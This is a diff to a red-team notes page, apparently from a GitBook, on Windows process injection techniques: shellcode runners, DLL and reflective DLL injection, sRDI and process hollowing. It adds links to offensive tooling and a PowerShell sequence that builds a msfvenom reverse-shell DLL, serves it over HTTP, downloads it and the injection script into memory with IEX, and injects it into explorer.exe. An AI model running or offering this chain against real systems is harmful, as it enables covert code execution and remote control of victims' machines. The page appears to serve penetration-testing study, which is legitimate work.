@@ -4,11 +4,15 @@
 
 {% embed url="https://github.com/plackyhacker/Shellcode-Injection-Techniques" %}
 
+{% embed url="https://github.com/r3nhat/ProcessInjection" %}
+
+{% embed url="https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader" %}
+
 ## <mark style="color:red;">Vanilla Shellcode Runner</mark>
 
 #### Create a thread in current process and execute the shellcode there.
 
-### <mark style="color:orange;">C#</mark>
+#### <mark style="color:orange;">C#</mark>
 
 {% code title="shellcode-runner.cs" %}
 ```csharp
@@ -79,7 +83,7 @@ namespace TestClass
 
 #### open a handle to another process with the same security context (privilege level), create a new remote thread in that process and execute the shellcode in the thread.
 
-### <mark style="color:orange;">C#</mark>
+#### <mark style="color:orange;">C#</mark>
 
 {% code title="shellcode-injector.cs" %}
 ```csharp
@@ -155,13 +159,13 @@ namespace Inject
 ```
 {% endcode %}
 
-## <mark style="color:red;">DLL Injector</mark>
+## <mark style="color:red;">DLL Injector</mark>&#x20;
 
 #### Using the techniques from process injection, we are able to load an unmanaged DLL into a remote process by resolving the address of `LoadLibraryA` inside the remote process and invoke it while supplying the name of the DLL we want to load.
 
 in this case the dll is downloaded and saved on disk.
 
-### <mark style="color:orange;">C#</mark>
+#### <mark style="color:orange;">C#</mark>
 
 {% code title="dll-injector.cs" %}
 ```csharp
@@ -211,16 +215,65 @@ namespace Inject
 ```
 {% endcode %}
 
-## <mark style="color:red;">Reflective DLL Injector</mark>
+#### <mark style="color:orange;">Powershell</mark>
+
+{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1" %}
+
+## <mark style="color:red;">Reflective DLL Injector (RDI)</mark>
 
 #### parses the relevant fields of the DLL’s Portable Executable (PE) file format and maps the contents into memory to avoid writing to disk. then the injector will use the previous technique to inject the DLL.
 
 {% hint style="warning" %}
 Injection works from Windows NT4 up to and including Windows 8, running on x86, x64 and ARM where applicable.
-
-Reflective DLL injection is not possible in C#, the other options are C/C++ and powershell
 {% endhint %}
 
-### <mark style="color:orange;">Powershell</mark>
+#### <mark style="color:orange;">Powershell</mark>
 
-{% embed url="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" %}
+{% embed url="https://raw.githubusercontent.com/charnim/Invoke-ReflectivePEInjection.ps1/main/Invoke-ReflectivePEInjection.ps1" %}
+
+serve the DLL and the powershell script (optional), run the following commands to load the dll and import the script, get the PID of target process and then inject the dll :
+
+```powershell
+# generate a payload or use custom DLL
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=6868 -f dll -o rev.dll
+
+# serve the DLL and powershell script
+python -m http.server 80
+
+# load the script and DLL into memory
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/rev.dll')
+IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.1/reflective.ps1')
+
+# get the process ID for explorer.exe
+$procid = (Get-Process -Name explorer).Id
+
+# invoke reflective DLL injection
+Invoke-ReflectivePEInjection -PEBytes $bytes -procid $procid
+```
+
+#### <mark style="color:orange;">C#</mark>
+
+{% embed url="https://github.com/r3nhat/XORedReflectiveDLL" %}
+
+#### <mark style="color:orange;">NIM</mark>
+
+{% embed url="https://github.com/S3cur3Th1sSh1t/Nim-RunPE/blob/main/NimRunPE.nim" %}
+
+## <mark style="color:red;">Shellcode Reflective DLL Injection (sRDI)</mark>
+
+#### Converting a given DLL into a position independent shellcode that can then be injected using your shellcode injection and execution techniques.
+
+{% embed url="https://github.com/monoxgas/sRDI" %}
+
+## <mark style="color:red;">Process Hollowing</mark>
+
+A bootstrap application creates a seemingly innocent process in a suspended state. The legitimate image is then unmapped and replaced with the image that is to be hidden. If the preferred image base of the new image does not match that of the old image, the new image must be rebased. Once the new image is loaded in memory the EAX register of the suspended thread is set to the entry point. The process is then resumed and the entry point of the new image is executed.
+
+
+
+
+
+&#x20;
+
+
+
